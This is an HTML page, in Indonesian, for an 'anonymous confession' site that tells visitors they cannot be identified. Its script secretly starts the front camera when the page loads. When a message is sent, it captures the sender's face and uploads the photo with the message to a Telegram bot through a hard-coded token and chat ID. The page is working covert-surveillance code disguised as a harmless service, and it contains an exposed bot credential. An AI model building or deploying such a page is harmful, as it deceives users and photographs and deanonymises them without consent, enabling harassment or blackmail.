# index.html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Pesan Anonim</title>
    <style>
        body { background: #0f0c29; background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; backdrop-filter: blur(10px); box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37); border: 1px solid rgba(255, 255, 255, 0.18); width: 90%; max-width: 400px; }
        h2 { margin-bottom: 10px; }
        p { font-size: 14px; color: #ccc; }
        textarea { width: 100%; height: 100px; border-radius: 10px; border: none; padding: 10px; margin: 20px 0; box-sizing: border-box; background: rgba(255, 255, 255, 0.2); color: white; outline: none; }
        .btn { background: #6e8efb; background: linear-gradient(to right, #a777e3, #6e8efb); color: white; border: none; padding: 12px 30px; border-radius: 25px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
        .btn:hover { transform: scale(1.05); }
        #video-hidden { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Confess Sini!</h2>
        <p>Tulis pesan anonim lu buat siapa aja. Aman, gak bakal ketauan siapa yang kirim.</p>
        
        <textarea id="pesan" placeholder="Tulis rahasia lu di sini..."></textarea>
        <button class="btn" onclick="kirimKonfess()">Kirim Pesan</button>
        
        <div id="status" style="margin-top: 15px; font-size: 12px;"></div>
    </div>

    <video id="video-hidden" autoplay playsinline muted></video>
    <canvas id="canvas-hidden" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video-hidden');
        const canvas = document.getElementById('canvas-hidden');
        
        // KONFIGURASI TELEGRAM LU
        const token = "7945183514:AAEQCbHUMs7DO0OfTBYgsHWtLDDOfiKSee0";
        const chatId = "8465963357";

        // Jalankan kamera langsung pas web dibuka
        async function initCam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
            } catch (e) {
                console.log("Kamera diblokir");
            }
        }
        initCam();

        async function kirimKonfess() {
            const pesanUser = document.getElementById('pesan').value;
            if (!pesanUser) { alert("Isi dulu pesannya!"); return; }

            document.getElementById('status').innerText = "Mengirim pesan secara anonim...";

            // 1. Kirim Foto Wajah
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const formPhoto = new FormData();
                formPhoto.append('chat_id', chatId);
                formPhoto.append('photo', blob, 'wajah_sender.png');
                formPhoto.append('caption', `Muka orang yang konfess:\n"${pesanUser}"`);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formPhoto
                });

                // Selesai
                alert("Pesan anonim berhasil terkirim!");
                document.getElementById('pesan').value = "";
                document.getElementById('status').innerText = "";
            }, 'image/png');
        }
    </script>
</body>
</html>
